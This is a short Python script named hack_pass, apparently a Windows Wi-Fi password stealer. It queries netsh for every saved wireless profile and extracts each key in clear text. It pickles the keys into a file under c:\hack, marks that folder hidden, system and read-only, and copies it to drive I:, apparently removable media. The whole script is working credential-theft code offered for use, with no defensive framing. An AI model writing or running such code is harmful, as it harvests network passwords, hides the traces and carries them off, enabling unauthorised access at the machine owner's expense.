def hack_pass():
	import subprocess as sp
	import os,pickle
	out=sp.check_output("netsh wlan show profiles")
	out=str(out)
	b=out.split(" ")
	new=list()
	final=list()
	dic={}

	for i in range(len(b)):
		if b[i]==":":
			j=i+1
			sr=""
			try:
				while b[j]!="":
				# if b[j]!="\":
						sr+=b[j]
						sr+=" "
						j+=1
				# else:
				# 	continue
				sr[-2]

				new.append(sr)
			except IndexError :
				pass


	for l in range(len(new)):
		test=str(new[l])
		l=len(test)
		final.append(test[:l-5])

	for e in final:
		tes=f"{str(e)}"
	#print(tes,end=" ")
	#print(type(tes))
		check_output=f'netsh wlan show profile name="{str(e)}" key=clear '
	#print(check_output)
		res=sp.check_output(check_output)
		res=str(res)
		raw_key=res.split(" ")
		for g in range(len(raw_key)):
			if raw_key[g]=="Content":
				t=g
				while raw_key[t]!=":":
					t+=1
				q=t+1
				key=raw_key[q]
				final_key=key[:len(key)-12]
				# print(final_key)
				dic[e]=final_key
	try:
		f=open(r"c:\\hack\\wifi_pass.dat","wb")

	except FileNotFoundError:
		os.mkdir(r"c:\\hack")
		# print("file created successfully")



	with open("c:\\hack\\wifi_pass.dat","wb") as file:
		pickle.dump(dic,file)
		# print("data written succesfully")

	os.chdir("c:\\")
# print(os.getcwd())
	os.system("attrib +h +s +r hack ")
	os.system("xcopy /s c:\hack\ I:")

	# print(dic)
if __name__=="__main__":
	hack_pass()

	






